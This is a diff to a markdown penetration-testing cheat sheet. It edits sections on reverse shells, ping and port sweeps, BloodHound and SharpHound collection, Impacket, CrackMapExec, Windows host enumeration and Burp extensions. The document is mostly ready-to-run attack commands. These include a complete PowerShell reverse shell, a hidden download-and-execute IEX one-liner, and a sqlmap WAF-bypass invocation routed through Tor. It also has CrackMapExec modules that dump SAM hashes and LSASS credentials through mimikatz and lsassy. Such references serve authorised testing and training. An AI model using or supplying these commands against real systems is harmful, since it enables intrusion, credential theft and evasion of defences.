@@ -20,6 +20,8 @@
 
 ## Reverse Shells
 
+* [https://securixy.kz/hack-faq/reverse-shell-ili-bjekkonnekt.html/](https://securixy.kz/hack-faq/reverse-shell-ili-bjekkonnekt.html/)
+
 
 
 ### Bash
@@ -82,7 +84,7 @@ PS > cmd /c C:\Windows\Temp\nc.exe 127.0.0.1 1337 -e powershell
 System.Net.Sockets.TCPClient:
 
 ```
-$client = New-Object System.Net.Sockets.TCPClient("10.10.14.234",1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0,ytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendbac "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+$client = New-Object System.Net.Sockets.TCPClient("10.10.14.234",1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
 
@@ -119,6 +121,8 @@ root@kali:$ {nc.tradentional|nc|ncat|netcat} [-6] -lvnp <LPORT>
 
 
 ### Upgrade to PTY
+
+* [https://securixy.kz/hack-faq/apgrejd-reverse-shell-do-interaktivnogo-tty.html/](https://securixy.kz/hack-faq/apgrejd-reverse-shell-do-interaktivnogo-tty.html/)
 
 ```
 $ python -c 'import pty; pty.spawn("/bin/bash")'
@@ -1247,7 +1251,7 @@ $ sqlmap -r request.req --batch --file-write=./backdoor.php --file-dest=C:/Inetp
 Test WAF:
 
 ```
-$ sqlmap.py -u 'https://127.0.0.1' --data='{"param":"*"}' -p 'param' -v3 --identify-waf --tamper='between,randomcase,space2comment' --random-agent --tor --check-tor --thread=1 --batch
+$ sqlmap.py -u 'https://127.0.0.1/index.php' --data='{"id":"*"}' -p id --identify-waf --tamper='between,randomcase,space2comment' --random-agent --tor --check-tor --thread=1 -b --batch -v6
 ```
 
 * [www.1337pwn.com/use-sqlmap-to-bypass-cloudflare-waf-and-hack-website-with-sql-injection/](https://www.1337pwn.com/use-sqlmap-to-bypass-cloudflare-waf-and-hack-website-with-sql-injection/)
@@ -2330,6 +2334,13 @@ root@kali:$ NET="0.0.0"; for i in $(seq 1 254); do (ping -c1 -W1 "$NET.$i" |grep
 root@kali:$ sort -u -t'.' -k4,4n hosts/pingsweep.txt > hosts/targets.txt && rm hosts/pingsweep.txt
 ```
 
+PowerShell:
+
+```
+PS > $NET="192.168.0";for($i=1;$i -lt 255;$i++){$command="ping -n 1 -w 100 $NET.$i > nul 2>&1 && echo $NET.$i";start-process -nonewwindow "cmd" -argumentlist "/c $command" -redirectstandardoutput "tmp$i.txt"};cat tmp*.txt > sweep.txt
+PS > rm tmp*.txt
+```
+
 Nmap:
 
 ```
@@ -2415,6 +2426,12 @@ Echo:
 ```
 root@kali:$ IP="0.0.0.0"; for p in $(seq 1 65535); do (timeout 1 bash -c "echo '.' >/dev/tcp/$IP/$port && echo OPEN:$port" >> hosts/ports.txt &) 2>/dev/null; done
 root@kali:$ sort -u -t':' -k1,1n hosts/ports.txt > hosts/echo-ports.txt && rm hosts/ports.txt
+```
+
+Netcat:
+
+```
+root@kali:$ seq 1 65535|xargs -n 1|xargs -P 0 -I {} nc -nv -z -w1 0.0.0.0 {} 2>&1| grep -vE "timed out|now in progress|Connection refused"
 ```
 
 Nmap:
@@ -2529,6 +2546,16 @@ PS > Discover-PSMSSQLServers | Select ServerName,Description | Tee-Object mssql.
 
 
 
+### NetBIOS Scanning
+
+#### nbname (MSF)
+
+```
+msf > use auxiliary/scanner/netbios/nbname
+```
+
+
+
 ### LHF Checkers & Exploits
 
 
@@ -2616,7 +2643,7 @@ Please make a selection: 1
 Grep only numbers to get list of ports separated by comma:
 
 ```
-root@kali:$ cat nmap/initial.nmap |egrep -o '^[0-9]{1,5}' |awk -F/ '{ print $1 }' |tr '\n' ','; echo
+root@kali:$ cat nmap/initial.nmap |egrep -o '^[0-9]{1,5}' |awk -F/ '{ print $1 }' ORS=','; echo
 ```
 
 Fast port discovery (Masscan) + versions and NSE scripts (Nmap):
@@ -2841,6 +2868,7 @@ $ cewl -d 5 -m 5 -w passwords.txt --with-numbers --email_file emails.txt http://
 
 ```
 $ sudo apt install neo4j
+$ mkdir -p /usr/share/neo4j/logs/
 $ sudo neo4j console
 ...change default password at localhost:7474...
 $ sudo neo4j start
@@ -2853,12 +2881,32 @@ $ sudo chmod 4755 chrome-sandbox
 $ ./BloodHound
 ```
 
-##### SharpHound.ps1
+##### SharpHound
 
 Collect graphs via `Ingestors/SharpHound.ps1`:
 
 ```
 PS > Invoke-Bloodhound -CollectionMethod All,GPOLocalGroup,LoggedOn -Domain MEGACORP.LOCAL -LDAPUser snovvcrash -LDAPPass 'Passw0rd!'
+```
+
+Run session loop (\~2 hours for best results):
+
+```
+PS > .\SharpHound.exe -c SessionLoop
+```
+
+##### Cypher
+
+* [hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)
+
+Show percentage of collected user sessions ([example](https://www.youtube.com/watch?v=q86VgM2Tafc)):
+
+```
+MATCH (u1:User)
+WITH COUNT(u1) AS totalUsers
+MATCH (c:Computer)-[r:HasSession]->(u2:User)
+WITH totalUsers, COUNT(DISTINCT(u2)) AS usersWithSessions
+RETURN totalUsers, usersWithSessions, 100 * usersWithSessions / totalUsers AS percetange
 ```
 
 ##### BloodHound.py
@@ -2872,18 +2920,16 @@ $ git clone https://github.com/fox-it/BloodHound.py ~/tools/BloodHound.py && cd 
 $ bloodhound-python -c All -u snovvcrash -p 'Passw0rd!' -d MEGACORP.LOCAL -ns 127.0.0.1
 ```
 
-##### Cypher
-
-* [hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)
-
 
 #### Impacket
 
 * [github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)
 
 ```
-$ git clone https://github.com/SecureAuthCorp/impacket
-$ sudo python -m pip install --upgrade .
+$ git clone https://github.com/SecureAuthCorp/impacket ~/tools/impacket && cd ~/tools/impacket
+$ pipenv install -r requirements.txt && pipenv shell
+(impacket) $ pip install .
+(impacket) $ python examples/psexec.py
 ```
 
 ```
@@ -2904,11 +2950,13 @@ Install bleeding-edge:
 
 ```
 $ git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec ~/tools/CrackMapExec && cd ~/tools/CrackMapExec
-$ sudo python3 -m pip install pipenv
 $ pipenv install && pipenv shell
 (CrackMapExec) $ python setup.py install
 (CrackMapExec) $ sudo ln -s /home/snovvcrash/.virtualenvs/CrackMapExec/bin/crackmapexec /usr/bin/CME
-(CrackMapExec) $ CME smb 127.0.0.1 -u 'anonymous' -p '' -M spider_plus
+(CrackMapExec) $ CME smb 127.0.0.1 -u 'anonymous' -p ''
+Or
+$ pipx install crackmapexec
+$ pipx run crackmapexec smb 127.0.0.1 -u 'anonymous' -p ''
 ```
 
 Use:
@@ -2921,6 +2969,7 @@ $ CME smb 127.0.0.1 -u nullinux_users.txt -p 'Passw0rd!' --shares [--continue-on
 $ CME smb 127.0.0.1 -u snovvcrash -p 'Passw0rd!' --spider-folder 'E\$' --pattern s3cret
 $ CME smb 127.0.0.1 -u j.doe -p 'Passw0rd!' -d 'CORP' --spider Users --pattern '.'
 $ CME smb 127.0.0.1 -u snovvcrash -p '' --local-auth --sam
+$ CME smb 127.0.0.1 -u snovvcrash -p '' -M spider_plus
 $ CME smb 127.0.0.1 -u snovvcrash -p '' -M mimikatz
 $ CME smb 127.0.0.1 -u snovvcrash -p '' -M lsassy
 ```
@@ -3011,7 +3060,9 @@ PS > route print
 PS > dir -force c:\
 PS > (wmic os get OSArchitecture)[2]
 PS > [Environment]::Is64BitOperatingSystem
+PS > [Environment]::Is64BitProcess
 PS > $ExecutionContext.SessionState.LanguageMode
+PS > [System.Net.Dns]::GetHostAddresses('hostname') | % {$_.IPAddressToString}
 
 PS > powershell -NoP -sta -NonI -W Hidden -Exec Bypass "IEX(New-Object Net.WebClient).DownloadString('https://github.com/BloodHoundAD/BloodHound/raw/master/Ingestors/SharpHound.ps1');Invoke-Bloodhound -CollectionMethod All,GPOLocalGroup,LoggedOn"
 ```
@@ -3028,6 +3079,17 @@ Common AV process names:
 
 ```
 PS > gc .\100-hosts.txt | % {gwmi -Query "select * from Win32_Process" -ComputerName $_ | ? {$_.Caption -in "name1.exe","name2.exe"} | select ProcessName,PSComputerName}
+```
+
+Identify Microsoft.NET version:
+
+```
+PS > cd C:\Windows\Microsoft.NET\Framework64\
+PS > ls
+PS > cd .\v4.0.30319\
+PS > Get-Item .\clr.dll | Fl
+Or
+PS > [System.Diagnostics.FileVersionInfo]::GetVersionInfo($(Get-Item .\clr.dll)).FileVersion
 ```
 
 
@@ -3059,6 +3121,64 @@ $ sudo apt install openjdk-11-jdk
 
 
 # Web
+
+
+
+
+## Web Security Academy
+
+* [All learning materials - detailed / Web Security Academy](https://portswigger.net/web-security/all-materials/detailed)
+* [All labs / Web Security Academy](https://portswigger.net/web-security/all-labs)
+* [SQL injection cheat sheet / Web Security Academy](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+* [Cross-Site Scripting (XSS) Cheat Sheet / Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
+
+
+
+
+## Upgrade Burp
+
+* [Downloads / Jython](https://www.jython.org/download.html)
+* [Прокачай свой Burp! 11 наиболее полезных плагинов к Burp Suite — «Хакер»](https://xakep.ru/2018/08/23/burp-suite-plugins/)
+
+
+
+### Extensions
+
+BApp Store:
+
+* [ActiveScan++](https://portswigger.net/bappstore/3123d5b5f25c4128894d97ea1acc4976) **Pro**
+* [Add Custom Header](https://portswigger.net/bappstore/807907f5380c4cb38748ef4fc1d8cdbc)
+* [Additional CSRF Checks](https://portswigger.net/bappstore/2d12070c90cb4a0f91cde0b8927fd606)
+* [Additional Scanner Checks](https://portswigger.net/bappstore/a158fd3fc9394253be3aa0bc4c181d1f) **Pro**
+* [Attack Surface Detector](https://portswigger.net/bappstore/47027b96525d4353aea5844781894fb1)
+* [Backslash Powered Scanner](https://portswigger.net/bappstore/9cff8c55432a45808432e26dbb2b41d8) **Pro**
+* [Collaborator Everywhere](https://portswigger.net/bappstore/2495f6fb364d48c3b6c984e226c02968) **Pro**
+* [CSRF Scanner](https://portswigger.net/bappstore/60f172f27a9b49a1b538ed414f9f27c3) **Pro**
+* [Freddy, Deserialization Bug Finder](https://portswigger.net/bappstore/ae1cce0c6d6c47528b4af35faebc3ab3) **Pro**
+* [HTTP Request Smuggler](https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646)
+* [IP Rotate](https://portswigger.net/bappstore/2eb2b1cb1cf34cc79cda36f0f9019874)
+* [J2EEScan](https://portswigger.net/bappstore/7ec6d429fed04cdcb6243d8ba7358880) **Pro**
+* [Java Deserialization Scanner](https://portswigger.net/bappstore/228336544ebe4e68824b5146dbbd93ae) **Pro**
+* [Java Serialized Payloads](https://portswigger.net/bappstore/bc737909a5d742eab91544705c14d34f)
+* [JS Link Finder](https://portswigger.net/bappstore/0e61c786db0c4ac787a08c4516d52ccf) **Pro**
+* [JSON Beautifier](https://portswigger.net/bappstore/309ef28d45ff4f19bedfed3896cb3ca9)
+* [JSON Web Token Attacker](https://portswigger.net/bappstore/82d6c60490b540369d6d5d01822bdf61)
+* [Logger++](https://portswigger.net/bappstore/470b7057b86f41c396a97903377f3d81)
+* [SQLiPy Sqlmap Integration](https://portswigger.net/bappstore/f154175126a04bfe8edc6056f340f52e)
+* [SSL Scanner](https://portswigger.net/bappstore/474b3c575a1a4584aa44dfefc70f269d)
+* [Taborator](https://portswigger.net/bappstore/c9c37e424a744aa08866652f63ee9e0f) **Pro**
+* [WordPress Scanner](https://portswigger.net/bappstore/77a12b2966844f04bba032de5744cd35)
+
+GitHub:
+
+* [Femida XSS](https://github.com/wish-i-was/femida)
+* [SHELLING](https://github.com/ewilded/shelling)
+* [burp-vulners-scanner](https://github.com/vulnersCom/burp-vulners-scanner)
+
+
+
+
+## Unsorted
 
 ```
 $ gobuster dir -u 'http://127.0.0.1' -w /usr/share/wordlists/dirbuster/directory-list[-lowercase]-2.3-medium.txt -x php,asp,aspx,jsp,ini,config,cfg,xml,htm,html,json,bak,txt -t 50 -a 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' -s 200,204,301,302,307,401 -o gobuster/127.0.0.1
@@ -3149,7 +3269,7 @@ $ sudo apt install docker-ce
 [$ sudo systemctl status docker]
 $ sudo usermod -aG docker ${USER}
 relogin
-[$ docker --rm run hello-world]
+[$ docker run --rm hello-world]
 ```
 
 
@@ -3443,6 +3563,7 @@ $ sudo route -n
 $ sudo vi /etc/resolv.conf 
 $ ping 8.8.8.8
 $ nslookup ya.ru
+$ sudo systemctl enable ssh --now
 ```
 
 
@@ -4347,58 +4468,3 @@ Cmd > takeown /F C:\$Windows.~BT\* /R /A
 Cmd > icacls C:\$Windows.~BT\*.* /T /grant administrators:F 
 Cmd > rmdir /S /Q C:\$Windows.~BT\
 ```
-
-
-
-
-
-# Useful Links
-
-
-
-
-## Web Security Academy
-
-* [All learning materials - detailed / Web Security Academy](https://portswigger.net/web-security/all-materials/detailed)
-* [All labs / Web Security Academy](https://portswigger.net/web-security/all-labs)
-* [SQL injection cheat sheet / Web Security Academy](https://portswigger.net/web-security/sql-injection/cheat-sheet)
-* [Cross-Site Scripting (XSS) Cheat Sheet / Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
-
-
-
-
-## Upgrade Burp
-
-* [Downloads / Jython](https://www.jython.org/download.html)
-* [Прокачай свой Burp! 11 наиболее полезных плагинов к Burp Suite — «Хакер»](https://xakep.ru/2018/08/23/burp-suite-plugins/)
-
-### Extensions
-
-BApp Store:
-
-* [ActiveScan++](https://github.com/portswigger/active-scan-plus-plus) **Pro**
-* [Add Custom Header](https://github.com/portswigger/add-custom-header)
-* [Additional CSRF Checks](https://github.com/portswigger/additional-csrf-checks)
-* [Additional Scanner Checks](https://github.com/portswigger/additional-scanner-checks) **Pro**
-* [Attack Surface Detector](https://github.com/portswigger/attack-surface-detector)
-* [Backslash Powered Scanner](https://github.com/portswigger/backslash-powered-scanner) **Pro**
-* [Collaborator Everywhere](https://github.com/portswigger/collaborator-everywhere) **Pro**
-* [CSRF Scanner](https://github.com/portswigger/csrf-scanner) **Pro**
-* [Freddy, Deserialization Bug Finder](https://github.com/portswigger/freddy-deserialization-bug-finder) **Pro**
-* [IP Rotate](https://github.com/portswigger/ip-rotate)
-* [J2EEScan](https://github.com/portswigger/j2ee-scan) **Pro**
-* [Java Deserialization Scanner](https://github.com/portswigger/java-deserialization-scanner) **Pro**
-* [Java Serialized Payloads](https://github.com/portswigger/java-serialized-payloads)
-* [JS Link Finder](https://github.com/portswigger/js-link-finder) **Pro**
-* [JSON Beautifier](https://github.com/portswigger/json-beautifier)
-* [JSON Web Token Attacker](https://github.com/portswigger/json-web-token-attacker)
-* [Logger++](https://github.com/portswigger/logger-plus-plus)
-* [SQLiPy Sqlmap Integration](https://github.com/portswigger/sqli-py)
-* [SSL Scanner](https://github.com/portswigger/ssl-scanner)
-* [Taborator](https://github.com/portswigger/taborator) **Pro**
-* [WordPress Scanner](https://github.com/portswigger/wordpress-scanner)
-
-GitHub:
-
-* [Femida XSS](https://github.com/wish-i-was/femida)
-* [SHELLING](https://github.com/ewilded/shelling)
